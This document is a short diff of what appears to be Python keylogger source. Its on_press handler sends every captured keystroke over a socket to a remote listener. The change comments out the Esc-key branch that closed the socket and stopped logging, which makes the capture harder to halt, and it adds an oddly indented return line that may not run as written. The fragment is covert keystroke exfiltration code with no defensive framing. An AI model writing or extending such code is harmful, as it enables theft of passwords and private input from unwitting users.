@@ -21,12 +21,13 @@ def on_press(key):
     data = (str(key))
     try:
         sock.sendall(data + "\n")
+	return True
     except:
         return True
-    finally:
-        if key == Key.esc:
-            sock.close()
-            return False
+    #finally:
+        #if key == Key.esc:
+            #sock.close()
+            #return False
 
 while True:
     try:
